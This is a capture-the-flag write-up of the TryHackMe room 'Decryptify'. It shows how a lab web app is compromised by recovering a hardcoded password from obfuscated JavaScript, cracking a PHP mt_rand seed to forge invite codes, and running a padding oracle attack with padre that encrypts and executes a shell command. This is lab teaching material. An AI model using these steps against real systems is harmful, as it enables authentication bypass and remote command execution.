---
title: "TryHackMe: Decryptify"
author: jaxafed
categories: [TryHackMe]
tags: [web, js, javascript, crypto, cryptography, fuzzing, php, insecure randomness, padding oracle attack, rce]
render_with_liquid: false
media_subpath: /images/tryhackme_decryptify/
image:
  path: room_image.webp
---

**Decryptify** started with deobfuscating a **JavaScript** file to reveal a hardcoded password, which we used to access a code snippet responsible for generating invite codes. After that, by fuzzing the web application, we discovered a log file containing an invite code and a couple of email addresses. Combining this with the **insecure randomness** vulnerability in the invite code generation logic allowed us to forge our own invite code and access the dashboard to capture the first flag.

After that, by using a **padding oracle attack**, we were able to execute commands on the target system to capture the last flag and complete the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/decryptify){: .center }

## Initial Enumeration

### Nmap Scan

We start with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.225.140
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5f:00:31:fc:33:87:c2:70:92:ec:41:32:18:b4:d6:ca (RSA)
|   256 0b:68:85:e6:84:ab:29:80:f5:33:90:8b:c4:de:c1:f6 (ECDSA)
|_  256 56:20:1c:2f:32:12:e6:f4:ae:75:e4:53:86:9a:f0:59 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login - Decryptify
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

- **22** (`SSH`)
- **1337** (`HTTP`)

### Web 1337

Checking `http://10.10.225.140:1337/`, we are greeted with a login page that also provides an option to log in using an invite code.

![Web 1337 Index](web_1337_index.webp){: width="1200" height="600"}

Additionally, clicking the **API Documentation** link at the bottom of the page redirects us to `http://10.10.225.140:1337/api.php`, where a password is required.

![Web 1337 API](web_1337_api.webp){: width="1200" height="600"}

## First Flag

### Accessing API Documentation

Checking the source code of `http://10.10.225.140:1337/index.php`, we find an interesting script, `/js/api.js`, being included.

![Web 1337 Index Source Code](web_1337_index_source_code.webp){: width="1200" height="600"}

Examining the script, we see that it is obfuscated.

![Web 1337 Api Js](web_1337_api_js.webp){: width="1200" height="300"}

Running [`webcrack`](https://github.com/j4k0xb/webcrack) to deobfuscate it reveals that the script simply sets the `c` variable to `H7gY2tJ9wQzD4rS1`.

```console
$ wget -q http://10.10.225.140:1337/js/api.js

$ webcrack api.js
const c = "H7gY2tJ9wQzD4rS1";
```

Testing `H7gY2tJ9wQzD4rS1` as the password for the `/api.php` endpoint, we find that it works, granting access to a code snippet that demonstrates how invite codes are generated for users.

![Web 1337 Api Two](web_1337_api2.webp){: width="1200" height="600"}

Analyzing the code, we see that it uses the user's email address and the `constant_value` parameter with the `calculate_seed_value` function to generate a seed. This seed is then used to initialize the `mt_rand` function, and the invite code is simply the first value returned by `mt_rand`, **base64** encoded.

```php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}
$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);
```

Thus, if we can obtain an email address and determine the value of the `constant_value` variable, we should be able to generate valid invite codes, log in as any user, and access the dashboard.

### Discovering the Log File

At this point, we have neither the email address nor the `constant_value`. However, by fuzzing the web application for directories, we discover an interesting directory at `/logs/`.

```console
$ ffuf -u 'http://10.10.225.140:1337/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
...
logs                    [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 122ms]
```
{: .wrap }

Checking `http://10.10.225.140:1337/logs/`, we find that indexing is enabled, and there is a single file named `app.log`.

![Web 1337 Logs](web_1337_logs.webp){: width="1200" height="600"}

Downloading the `app.log` file, we find that an invite code, `MTM0ODMzNzEyMg==`, was generated for the email address `alpha@fake.thm`, and there is also another email address: `hello@fake.thm`.

```console
$ wget -q http://10.10.225.140:1337/logs/app.log

$ cat app.log
2025-01-23 14:32:56 - User POST to /index.php (Login attempt)
2025-01-23 14:33:01 - User POST to /index.php (Login attempt)
2025-01-23 14:33:05 - User GET /index.php (Login page access)
2025-01-23 14:33:15 - User POST to /index.php (Login attempt)
2025-01-23 14:34:20 - User POST to /index.php (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:35:25 - User GET /index.php (Login page access)
2025-01-23 14:36:30 - User POST to /dashboard.php (User alpha@fake.thm deactivated)
2025-01-23 14:37:35 - User GET /login.php (Page not found)
2025-01-23 14:38:40 - User POST to /dashboard.php (New user created: hello@fake.thm)
```

### Finding the Seed

Trying to use the invite code we discovered in the logs to log in as the `alpha@fake.thm` user, we receive the error: `The user alpha@fake.thm has been deactivated.` It seems the account was indeed deactivated, as indicated in the logs.

![Web 1337 Login](web_1337_login.webp){: width="1200" height="600"}

However, from the code snippet, we know that the invite code is simply the first value generated by the `mt_rand` function after being seeded. This is crucial because it allows us to use a tool like [php_mt_seed](https://www.openwall.com/php_mt_seed/) to discover all possible seed values that could have generated this value.

First, decoding the invite code from **base64**, we obtain the value generated by `mt_rand`, which is `1348337122`

```console
$ echo MTM0ODMzNzEyMg== | base64 -d
1348337122
```

Next, we download and build the `php_mt_seed` program.

```console
$ wget -q https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz
$ tar -xzf php_mt_seed-4.0.tar.gz
$ cd php_mt_seed-4.0
$ make
```

Finally, running the `php_mt_seed` program with the value of the invite code, we obtain all possible seed values. 

```console
$ ./php_mt_seed 1348337122
Pattern: EXACT
Version: 3.0.7 to 5.2.0
Found 0, trying 0xfc000000 - 0xffffffff, speed 755.0 Mseeds/s
Version: 5.2.1+
Found 0, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s
seed = 0x00143783 = 1324931 (PHP 7.1.0+)
Found 1, trying 0x18000000 - 0x19ffffff, speed 6.2 Mseeds/s
seed = 0x198ad677 = 428529271 (PHP 7.1.0+)
Found 2, trying 0x2a000000 - 0x2bffffff, speed 6.0 Mseeds/s
seed = 0x2addc25a = 719176282 (PHP 7.1.0+)
Found 3, trying 0x36000000 - 0x37ffffff, speed 6.2 Mseeds/s
seed = 0x37aaaa7b = 933931643 (PHP 5.2.1 to 7.0.x; HHVM)
Found 4, trying 0x58000000 - 0x59ffffff, speed 6.3 Mseeds/s
seed = 0x590030a0 = 1493184672 (PHP 5.2.1 to 7.0.x; HHVM)
seed = 0x590030a0 = 1493184672 (PHP 7.1.0+)
Found 6, trying 0x66000000 - 0x67ffffff, speed 6.2 Mseeds/s
seed = 0x66c05097 = 1723879575 (PHP 5.2.1 to 7.0.x; HHVM)
seed = 0x66c05097 = 1723879575 (PHP 7.1.0+)
Found 8, trying 0x84000000 - 0x85ffffff, speed 6.1 Mseeds/s
seed = 0x850b0811 = 2232092689 (PHP 7.1.0+)
Found 9, trying 0xfe000000 - 0xffffffff, speed 6.3 Mseeds/s
Found 9
```

### Calculating the Invite Code

Since the seed value is the sum of values derived from the email address and the `constant_value`, and now that we have the possible seed values and the email, we can calculate the `constant_value` using a **PHP** script:

```php
<?php
$email = "alpha@fake.thm";
$seed_value = 1324931;

$email_length = strlen($email);
$email_hex = hexdec(substr($email, 0, 8));
$sum_value = dechex($seed_value);

$constant_value = $sum_value - ($email_length + $email_hex);
echo "The constant value is: " . $constant_value;
?>
```
{: file="constant.php" }

Testing all the seed values to discover all possible `constant_value` values, it seems that the seed value for `alpha@fake.thm` was `1324931` and the `constant_value` is `99999`.

```console
$ php constant.php
The constant value is: 99999
```

With the knowledge of the `constant_value`, we can use the same method from the code snippet to generate an invite code for the other email (`hello@fake.thm`) discovered in the log file, as shown below:

```php
<?php
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

$email = "hello@fake.thm";
$constant_value = 99999;

$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);
echo "The invite code for " . $email . " is: " . $invite_code;
?>
```
{: file="invite.php" }

Running the script, we generate the invite code for the `hello@fake.thm` email address as `NDYxNTg5ODkx`.

```console
$ php invite.php
The invite code for hello@fake.thm is: NDYxNTg5ODkx
```

Using the invite code we generated, we attempt to log in at `http://10.10.225.140:1337/index.php`.

![Web 1337 Login Two](web_1337_login2.webp){: width="1200" height="600"}

As we can see, it works, and we are greeted with the first flag on `http://10.10.225.140:1337/dashboard.php`. 

![Web 1337 Dashboard](web_1337_dashboard.webp){: width="1200" height="600"}

## Second Flag

Apart from the flag, we also see another email address on the dashboard for the `admin@fake.thm` user. Unfortunately, trying to generate an invite code for this email address and attempting to log in with it proves unsuccessful.

However, checking the source code for the dashboard page reveals an interesting form.

![Web 1337 Dashboard Source Code](web_1337_dashboard_source_code.webp){: width="1200" height="600"}

### Padding Oracle Attack

Testing the `date` parameter with its default value in the source code does not yield anything of interest.

![Web 1337 Dashboard Padding](web_1337_dashboard_padding.webp){: width="1200" height="600"}

However, modifying the `date` parameter results in an intriguing error message indicating a **padding error**.

![Web 1337 Dashboard Padding Two](web_1337_dashboard_padding2.webp){: width="1200" height="600"}

Since the application returns an error message for incorrect padding, we can exploit this to perform a [**padding oracle attack**](https://en.wikipedia.org/wiki/Padding_oracle_attack) using the [`padre`](https://github.com/glebarez/padre) tool.

First, we use the **padding oracle** to decrypt the default value for the `date` parameter and discover that it corresponds to the `date +%Y` command, which seems to be how the application prints the current year in the footer.

```console
$ ./padre -u 'http://10.10.225.140:1337/dashboard.php?date=$' -cookie 'PHPSESSID=bmsj2b5btlphctiundj21o4ggl' 'ET7bSJfUSDJmUAl8O4smqP91XxJSk0qgj2FnpulyU3c='
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] successfully detected padding oracle
[+] detected block length: 8
[!] mode: decrypt
[1/1] date +%Y\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08                  [24/24] | reqs: 2981 (37/sec)
```
{: .wrap }

Now, we can also use the **padding oracle** to encrypt data instead of decrypting. Since our goal is to read the flag located at `/home/ubuntu/flag.txt`, we can encrypt the command `cat /home/ubuntu/flag.txt` as follows, which results in `8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==`.

```console
$ ./padre -u 'http://10.10.225.140:1337/dashboard.php?date=$' -cookie 'PHPSESSID=bmsj2b5btlphctiundj21o4ggl' -enc 'cat /home/ubuntu/flag.txt'
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] successfully detected padding oracle
[+] detected block length: 8
[!] mode: encrypt
[1/1] 8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==                                  [40/40] | reqs: 4509 (53/sec)
```
{: .wrap }

Finally, setting the `date` parameter to `8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==` by making a request to `http://10.10.225.140:1337/dashboard.php?date=8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==`, we see that our encrypted command is executed, and the second flag is displayed in the footer.

![Web 1337 Dashboard Flag](web_1337_dashboard_flag.webp){: width="1200" height="600"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
